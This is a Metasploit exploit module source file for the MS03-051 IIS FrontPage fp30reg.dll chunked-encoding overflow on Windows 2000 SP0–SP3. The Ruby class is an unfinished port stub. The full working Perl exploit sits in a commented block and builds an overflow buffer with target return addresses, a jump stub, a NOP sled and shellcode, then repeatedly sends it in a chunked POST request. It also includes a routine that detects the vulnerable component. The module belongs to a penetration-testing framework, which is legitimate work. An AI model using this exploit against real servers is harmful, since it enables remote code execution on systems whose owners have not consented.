require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS FrontPage fp30reg.dll Chunked Overflow',
			'Description'    => %q{
				This is an exploit for the chunked encoding buffer overflow
				described in MS03-051 and originally reported by Brett
				Moore. This particular modules works against versions of
				Windows 2000 between SP0 and SP3. Service Pack 4 fixes the
				issue.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '2952'],
					[ 'MSB', 'MS03-051'],
					[ 'MIL', '29'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Nov 11 2003',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis_fp30reg_chunked;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'    => 'IIS FrontPage fp30reg.dll Chunked Overflow',
	'Version' => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 1024,
		'BadChars'  => "\x00+&=%\x0a\x0d\x20",
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This is an exploit for the chunked encoding buffer overflow
    described in MS03-051 and originally reported by Brett
    Moore. This particular modules works against versions of
    Windows 2000 between SP0 and SP3. Service Pack 4 fixes the
    issue.
}),

	'Refs'  =>
	  [
		['OSVDB', '2952'],
		['MSB',   'MS03-051'],
		['MIL',   '29'],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['Windows 2000 SP0-SP3',  0x6c38a4d0],   # from mfc42.dll
		['Windows 2000 07/22/02', 0x67d44eb1],   # from fp30reg.dll 07/22/2002
		['Windows 2000 10/06/99', 0x67d4665d],   # from fp30reg.dll 10/06/1999
	  ],

	'Keys' => ['iis'],

	'DisclosureDate' => 'Nov 11 2003',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;

	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

	my @targets;
	my @offsets;
	my $pad;

	my $ret = defined($target_idx) ? ($self->Targets->[ $target_idx ]->[1]) : $self->Targets->[0]->[1];
	my $pattern = Pex::Text::PatternCreate(0xDEAD);

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $count = 0;
	while (1)
	{
		if ($count % 3 == 0)
		{
			$self->PrintLine("[*] Refreshing remote process...");
			my $res = $self->Check();
			$count = 0;
		}

		substr($pattern, 128, 4, pack("V", $ret));
		substr($pattern, 264, 4, pack("V", $ret));
		substr($pattern, 160, 7, "\x2d\xff\xfe\xff\xff" . "\xff\xe0");
		substr($pattern, 280, 512, $self->MakeNops(512));
		substr($pattern, 792, length($shellcode), $shellcode);

		my $request;
		$request  = "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n";
		$request .= "Host: $target_host:$target_port\r\n";
		$request .= "Transfer-Encoding: chunked\r\n";
		$request .= "\r\n";
		$request .= "DEAD\r\n";
		$request .= $pattern . "\r\n";
		$request .= "0\r\n";

		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		  );
		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		$self->PrintLine("[*] Sending exploit request...");
		$s->Send($request);
		sleep(1);
		$s->Close();
		$count++;
	}
	return;
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $getreq = "GET /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1\r\n".
	  "Host: $target_host:$target_port\r\n\r\n";

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send($getreq);
	my $res = $s->Recv(-1, 10);
	$s->Close();

	if ($res !~ /501 Not Implemented/)
	{
		$self->PrintLine("[*] Frontpage component was not found");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Frontpage component found");
	return $self->CheckCode('Detected');
}

1;

=end


end
end	
